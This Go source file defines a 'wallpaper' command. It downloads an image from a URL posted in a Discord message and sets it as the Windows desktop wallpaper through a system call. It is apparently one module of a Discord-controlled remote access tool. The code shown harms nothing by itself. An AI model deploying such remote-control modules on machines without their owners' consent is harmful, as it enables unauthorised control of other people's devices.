package commands

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"

	"requiem/store"
	"requiem/utils"
	"requiem/utils/discord"
)

func (*WallpaperCommand) Exec(ctx *store.CommandContext, args []string) {
	urls := discord.GetUrls(ctx)
	if len(urls) == 0 {
		ctx.ReplyMsg("🟥 Failed to find any urls.")
		return
	}

	path, err := utils.DownloadFile(urls[0], "")
	if err != nil {
		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to download - %s", err))
		return
	}

	defer os.Remove(path)

	pointer, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to resolve path - %s", err))
		return
	}

	ret, _, _ := store.SystemInfo.Call(
		uintptr(0x0014),
		uintptr(0),
		uintptr(unsafe.Pointer(pointer)),
		uintptr(0x01|0x02),
	)

	if ret == 0 {
		ctx.ReplyMsg("🟥 Failed to set wallpaper.")
		return
	}

	ctx.ReplyMsg("🟩 Successfully set wallpaper.")
}

func (*WallpaperCommand) Name() string {
	return "wallpaper"
}

func (*WallpaperCommand) Info() string {
	return "Sets the device wallpaper."
}

type WallpaperCommand struct{}
